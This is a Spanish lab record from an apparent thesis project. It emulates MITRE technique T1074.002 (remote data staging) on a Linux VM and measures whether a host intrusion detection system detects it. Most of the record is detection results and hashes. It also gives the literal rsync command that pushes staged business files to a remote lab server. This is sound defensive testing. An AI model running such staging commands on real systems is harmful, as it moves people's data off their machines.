---
fase: 3
bloque: fase-03-ampliacion-2
tanda: C
ata_id: ATA040
tecnica: T1074.002
tactica: Collection
version: 1
status: cerrado
fecha: 2026-09-29
---

# Ficha — ATA040 · T1074.002 Remote Data Staging (staging al recurso remoto) — Linux

> Bloque `fase-03-ampliacion-2` (**tanda C**, 2.º de 5). Generada por `tfg-executor`. **Sin secretos.**
> Estado **`cerrado`**: criterio de doble iteración **v2** → **`iguales`**. Métrica congelada (O1+O2).

## 1. Identificación

| Campo | Valor |
|---|---|
| ATA | **ATA040** |
| Técnica | **T1074.002 — Remote Data Staging** |
| Táctica | Collection |
| Sistema | Linux (`victima-linux`, Ubuntu Server 24.04.5 LTS) |
| Vía | **manual / custom** |
| Ejecución | usuario `angel`, **sin `sudo`** |
| Capa del HIDS | **`execve`** del cliente (`rsync`) |

## 2. Fuente del ataque

| Campo | Valor |
|---|---|
| Fuente | `custom` (escrito por el TFG) |
| Herramienta | **`rsync`** 3.2.7 (`rsync://192.168.65.128:9873/incoming/ATA040/`, módulo escritura) |
| Efecto | **staging remoto** del material recolectado (sale de la víctima al servidor) |
| Elevación | **no** |
| Guardarraíl | el destino **DEBE** ser `192.168.65.128:9873`; semilla bajo `lab-attack/ATA040` |

Artefacto: `.../T1074.002-Remote_Data_Staging/ATA040_ataque.sh`
(`sha256=539c7ef3dc371c2b4c03a222bdddfe86c9d8432f7a8f533ef91316db8c91daed`).
Señales: `.../ATA040_esperado.csv` (`sha256=b91a6f32b0b9741134818144a3df7ff10734b29fd366c7884b240d411e329c1e`).
Validación humana: **APROBADO 2026-09-29**.
C0: `.../c0/ATA040_logtest.txt` (`sha256=52fc71ff52517822a3c40eb95ca3a41076a71d287e3361bd1738368048ed86d6`)
→ `ATA040_preflight.md` (`sha256=78351b372755c4bd312f2d9b34b227ecfb02c9127581919128fa956eeb4a6cb5`) **PASA**
(1 evento `rsync` → `80792` level 3; sin silenciador).

## 3. ⚠️ Qué se montó para el «recurso remoto» (paso 0)

Mismo recurso que ATA039 (ver su ficha §3): **no se monta FS** (sin cliente NFS/SMB offline); el
destino remoto es el **módulo escribible `incoming`** del **daemon `rsync`** del manager
(`/home/angel/lab-share/incoming/`). «Montar»/«desmontar» = arrancar/parar el daemon (§10).
Diferencia con ATA039: dirección **local → remoto** (staging), no recolección.

## 4. Iteraciones

| Iter | t0 (UTC) | t1 (UTC) | Dur | snapshot |
|---|---|---|---|---|
| 1 | `2026-09-29T11:49:39Z` | `2026-09-29T11:50:11Z` | 32 s | `lab-listo` |
| 2 | `2026-09-29T11:52:29Z` | `2026-09-29T11:53:01Z` | 32 s | `lab-listo` |

## 5. Comando ejecutado (literal)

```bash
cd /home/angel/lab-attack/ATA040
bash ATA040_ataque.sh   # rsync --list-only + rsync -a ./staging/ rsync://192.168.65.128:9873/incoming/ATA040/
```

## 6. Evidencia

`Logs/ATA040_iter{1,2}/`: `times.log`, `ejecucion.out`, `deps.txt`, `staging_remoto.txt`.

**Prueba de éxito — el material se estagió en el recurso remoto** (sha256 local == sha256 en el
manager, `staging_remoto.txt`):

| Fichero | sha256 (coincide) |
|---|---|
| `staging/clientes.csv` | `2ad637b8797a4c6e22a5da27f698f31c9da4088367df78a795414d1a6721d9e6` |
| `staging/facturas.csv` | `1011daaaa9e7a03a133476dad85bec06a61f30d21a13150b598105a8e35de115` |
| `staging/nominas.csv` | `b5c25b1a11f3e25998ed228122476a0352b894f14221cc9a94257705601a810d` |

## 7. Ventana extraída

| Iter | `_raw` | victima-linux | Detalle |
|---|---|---|---|
| 1 | 1050 | 1043 | 1044 |
| 2 | 1131 | 1124 | 1125 |

## 8. Resultado

| Iter | filas | deteccion | auto_ruido | ruido_conocido | dudosa | artefacto_ataque | RS1 | RS2 | RS3 | RS4 |
|---|---|---|---|---|---|---|---|---|---|---|
| 1 | 1044 | **2** | 607 | 420 | **0** | 15 | 10 | 1034 | 0 | 0 |
| 2 | 1125 | **2** | 643 | 463 | **0** | 17 | 4 | 1121 | 0 | 0 |

### 8.1 Detecciones — desglose

| Iter | alertas | `rule_id` distintos | esperadas | sorpresas | primera evidencia |
|---|---|---|---|---|---|
| 1 | 2 | 1 · `{80792}` | **S1** | 0 | `11:49:41.465Z` `Audit: Command: /usr/bin/rsync` |
| 2 | 2 | 1 · `{80792}` | **S1** | 0 | `11:52:31.312Z` `Audit: Command: /usr/bin/rsync` |

- **`80792`** `Audit: Command: /usr/bin/rsync` (señal `S1`, anclado al `cwd`) — listado + envío.
- **`dudosa` resueltas:** iter1 **7** PAM → **`ruido`**; iter2 **3** PAM → **`ruido`**.
  **Ninguna** fila del ataque en `ruido`.

### 8.2 Métrica de detección — **O1 + O2**

| Iter | O1 | `rule_id` | primera evidencia | O2 | desglose det/art/ruido | anexo |
|---|---|---|---|---|---|---|
| 1 | **sí** | `{80792}` | `11:49:41.465Z` `Audit: Command: /usr/bin/rsync` | **1/1** (`S1`) | 2 / 15 / 420 | 2 / 1 `rule_id` |
| 2 | **sí** | `{80792}` | `11:52:31.312Z` `Audit: Command: /usr/bin/rsync` | **1/1** (`S1`) | 2 / 17 / 463 | 2 / 1 `rule_id` |

## 9. Doble iteración (criterio **v2**) — veredicto **`iguales`**

- **C1′:** ✅ `{80792} == {80792}`. **C2′:** ✅ `|2−2|=0 ≤ 2`. **C3′:** ✅ sin dudosas (7 + 3). Ver
  `Bitacora/ATA040.json`.

## 10. Limitaciones y hallazgos

1. **⚠️ Sin cliente NFS/SMB offline:** staging remoto vía **daemon `rsync`** del manager (declarado).
   El HIDS de host **no ve la red**; la prueba es el **sha256 coincidente** en el recurso remoto.
2. **Distinción con ATA039:** mismo recurso, **dirección opuesta** (local → remoto). Mismo binario
   (`rsync`) → O2 1/1 por ancla.
3. **Cierre:** daemon parado y `~/lab-share` borrado (verificado).
